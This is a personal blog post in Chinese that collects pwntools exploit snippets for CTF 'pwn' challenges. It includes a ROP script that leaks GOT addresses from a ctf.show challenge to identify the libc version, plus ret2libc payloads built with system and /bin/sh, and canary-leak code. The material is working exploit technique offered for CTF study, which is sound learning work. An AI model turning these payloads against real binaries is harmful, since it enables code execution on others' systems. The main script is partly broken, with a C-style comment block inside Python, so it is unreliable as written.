---
title: "pwn公式脚本小搜集"
image: ''
pinned: false
comment: true
published: 2026-03-21
description: "pwn"
category: PWN
tags: [PWN]
---



# 一.通过libcsearch确认libc版本

```
from pwn import *
from LibcSearcher import *
import os

context(os='linux', arch='amd64', log_level='debug')

sh = remote('pwn.challenge.ctf.show', 28202)
elf = ELF('./pwn')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
offset = 20

# 这里定义要泄露的函数，不只是 puts
LEAK_FUNCS = ['puts', 'gets', 'setvbuf', '__libc_start_main']

def leak_func(sym):
    # 每次泄露一个函数地址：puts(got[sym])
    payload  = b'a' * offset
    payload += p64(pop_rdi)
    payload += p64(elf.got[sym])      # 关键：换不同 sym 就泄露不同函数
    payload += p64(elf.plt['puts'])   # 用 puts 打印 got[sym] 里的真实地址
    payload += p64(elf.sym['welcome'])# 回到 welcome，方便下一次继续泄露
    sh.sendline(payload)

    /*
    sh.recvline(timeout=2)            # 吃掉 echo 行
    data = sh.recvn(6, timeout=2)     # 读到泄露地址（低6字节）
    sh.recvline(timeout=2)            # 吃掉换行
    return u64(data.ljust(8, b'\x00'))
	*/
	
def parse_symbols(path):
    d = {}
    with open(path, 'r', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or ' ' not in line:
                continue
            k, v = line.split(' ', 1)
            try:
                d[k] = int(v.strip(), 16)
            except ValueError:
                pass
    return d

def find_unique_libc(leaks):
    lib = LibcSearcher('puts', leaks['puts'])
    db = lib.libc_database_path
    need = LEAK_FUNCS + ['system', 'str_bin_sh']
    candidates = []

    for fn in os.listdir(db):
        if not fn.endswith('.symbols'):
            continue
        syms = parse_symbols(db + fn)
        if not all(k in syms for k in need):
            continue

        base = leaks['puts'] - syms['puts']
        # 关键：用 gets/setvbuf/__libc_start_main 的完整地址继续筛
        if all(base + syms[s] == leaks[s] for s in LEAK_FUNCS[1:]):
            candidates.append(fn)

    candidates = list(dict.fromkeys(candidates))
    if len(candidates) != 1:
        raise RuntimeError(f'Not unique: {len(candidates)} -> {candidates[:10]}')

    return candidates[0]

# 关键：这里会循环泄露 4 个函数地址
leaks = {}
for s in LEAK_FUNCS:
    leaks[s] = leak_func(s)
    log.success(f'leak {s} = {hex(leaks[s])}')

libc_name = find_unique_libc(leaks)
print('[+] UNIQUE libc:', libc_name)

sh.close()

```

## 注意：

此脚本为偶遇一题通过泄露函数确定libc版本的题目，后续攻击均需我们自己指定文件，脚本为ai根据我的wp跑成，关键在于确定libc版本的那几段，所以仅用来参考，不要照抄。



# 二.ROP常用代码

```
rop=ROP('./XXX')
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
```

```
payload = b'A' * offset 
payload += p64(ret)      #栈对齐使用
payload += p64(pop_rdi) 
payload += p64(bin_sh) 
payload += p64(system_plt)
64位二点简单rop使用ret2text
```

```
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr  = libc_base + libc.dump('str_bin_sh')
```













# 三.读取地址代码

```
canary = u64(canary_raw.rjust(8, b'\x00')) 
```

```
p.sendline(payload1)
p.recvuntil(payload1)
leaked_canary = u64(p.recv(8).ljust(8, b'\x00')) - 0xa #sendline发送数据末尾有换行0xa
```







# 四.环境配置代码

```
context(os='linux', arch='amd64', log_level='debug')
```









---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
